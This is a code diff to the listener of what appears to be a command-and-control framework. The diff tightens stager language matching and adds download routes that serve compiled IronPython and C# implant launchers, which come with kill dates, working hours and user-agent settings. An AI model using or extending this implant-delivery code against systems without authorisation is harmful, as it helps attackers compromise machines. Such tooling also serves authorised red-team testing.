@@ -261,7 +261,7 @@ class Listener(object):
                 listenerOptions["Cookie"]["Value"] = generate
                 cookie = generate
 
-            if language.startswith("po"):
+            if language == "powershell":
                 # PowerShell
                 stager = '$ErrorActionPreference = "SilentlyContinue";'
 
@@ -394,7 +394,7 @@ class Listener(object):
                     # otherwise return the case-randomized stager
                     return stager
 
-            if language.startswith("py"):
+            if language == "python":
                 # Python
                 launcherBase = "import sys;"
                 if "https" in host:
@@ -495,7 +495,7 @@ class Listener(object):
                     return launcherBase
 
             # very basic csharp implementation
-            if language.startswith("csh"):
+            if language == "csharp":
                 workingHours = listenerOptions["WorkingHours"]["Value"]
                 killDate = listenerOptions["KillDate"]["Value"]
                 customHeaders = profile.split("|")[2:]  # todo: support custom headers
@@ -859,7 +859,7 @@ class Listener(object):
         @app.route("/download/<stager>/")
         @app.route("/download/<stager>/<options>")
         def send_stager(stager, options=None):
-            if "po" in stager:
+            if "powershell" == stager:
                 if options:
                     options = base64.b64decode(options).decode("UTF-8")
                     options = options.split(":")
@@ -899,7 +899,7 @@ class Listener(object):
                     )
                     return launcher
 
-            elif "py" in stager:
+            elif "python" == stager:
                 launcher = self.mainMenu.stagers.generate_launcher(
                     listenerName,
                     language="python",
@@ -910,6 +910,36 @@ class Listener(object):
                 )
                 return launcher
 
+            elif "ironpython" == stager:
+                launcher = self.mainMenu.stagers.generate_launcher(
+                    listenerName,
+                    language="python",
+                    encode=False,
+                    userAgent=userAgent,
+                    proxy=proxy,
+                    proxyCreds=proxyCreds,
+                )
+
+                directory = self.mainMenu.stagers.generate_python_exe(
+                    launcher, dot_net_version="net40"
+                )
+                with open(directory, "rb") as f:
+                    code = f.read()
+                return code
+
+            elif "csharp" == stager:
+                filename = self.mainMenu.stagers.generate_launcher(
+                    listenerName,
+                    language="csharp",
+                    encode=False,
+                    userAgent=userAgent,
+                    proxy=proxy,
+                    proxyCreds=proxyCreds,
+                )
+                directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/net35/{filename}.exe"
+                with open(directory, "rb") as f:
+                    code = f.read()
+                return code
             else:
                 return make_response(self.default_response(), 404)
 
@@ -1189,7 +1219,6 @@ class Listener(object):
 
             if certPath.strip() != "" and host.startswith("https"):
                 certPath = os.path.abspath(certPath)
-                pyversion = sys.version_info
 
                 # support any version of tls
                 pyversion = sys.version_info
